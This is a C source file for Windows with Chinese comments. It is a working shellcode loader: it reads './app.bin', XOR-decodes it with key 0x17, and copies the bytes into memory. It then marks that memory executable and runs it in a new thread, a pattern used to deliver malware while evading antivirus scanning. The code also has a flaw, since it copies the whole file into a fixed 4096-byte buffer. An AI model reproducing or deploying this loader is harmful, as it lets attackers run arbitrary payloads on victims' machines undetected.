/*
vs2019
多字节字符集
x86
debug
运行库: /MTd
*/
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>

BYTE* read2Mem(char* fpath, int* flen)
{
    // 打开文件
    DWORD fileSize;
    LPVOID pMemory;
    DWORD bytesRead;
    *flen = 0;
    HANDLE hFile = CreateFileA(fpath,  // 文件路径，根据实际情况进行修改
        GENERIC_READ,               // 访问模式，只读
        0,                          // 共享模式，不共享
        NULL,                       // 安全特性，使用默认值
        OPEN_EXISTING,              // 打开已存在的文件
        FILE_ATTRIBUTE_NORMAL,      // 文件属性，正常
        NULL                        // 模板文件句柄，不使用
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("无法打开文件\n");
        return NULL;
    }

    // 获取文件大小
    fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE)
    {
        printf("无法获取文件大小\n");
        CloseHandle(hFile);
        return NULL;
    }

    // 分配内存
    pMemory = VirtualAlloc(
        NULL,                   // 指定分配的地址，在此使用 NULL 表示由系统选择
        fileSize,               // 分配的内存大小，与文件大小一致
        MEM_COMMIT,             // 内存分配类型，表示提交内存
        PAGE_READWRITE          // 内存页面属性，读写权限
    );
    if (pMemory == NULL)
    {
        printf("无法分配内存\n");
        CloseHandle(hFile);
        return NULL;
    }

    if (!ReadFile(
        hFile,                  // 文件句柄
        pMemory,                // 缓冲区地址，用于接收文件内容
        fileSize,               // 要读取的字节数，与文件大小一致
        &bytesRead,             // 实际读取的字节数
        NULL                    // 用于传递异步 I/O 句柄，不使用
    )) {
        printf("读取文件失败\n");
        VirtualFree(pMemory, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return NULL;
    }
    CloseHandle(hFile);
    //VirtualFree(pMemory, 0, MEM_RELEASE);
    *flen = fileSize;
    return pMemory;
}

DWORD WINAPI mm_thread(LPVOID lpThreadParameter) {

    int shellcode_size = 0; //shellcode长度
    DWORD dwThreadId;   //线程Id
    HANDLE hThread;     //线程句柄
    DWORD dwOldProtect; //内存页属性

    char* buf = read2Mem("./app.bin", &shellcode_size);

    for (int i = 0; i < shellcode_size; i++)
    {
        buf[i] ^= 0x17;

    }
    char* shellcode = (char*)VirtualAlloc(
        NULL,
        4096,
        MEM_COMMIT,
        PAGE_READWRITE  //只申请可读可写
    );
    memcpy(shellcode, buf, shellcode_size); //将shellcode复制到可读可写的内存中
    VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &dwOldProtect); //更改属性为可执行
    hThread = CreateThread(
        NULL, // 安全描述符
        NULL, // 栈的大小
        shellcode, // 函数
        NULL, // 参数
        NULL, // 线程标志
        &dwThreadId // 线程ID
    );

    WaitForSingleObject(hThread, INFINITE);
    return 0;
}

int main()
{

    mm_thread(NULL);
    return 0;
}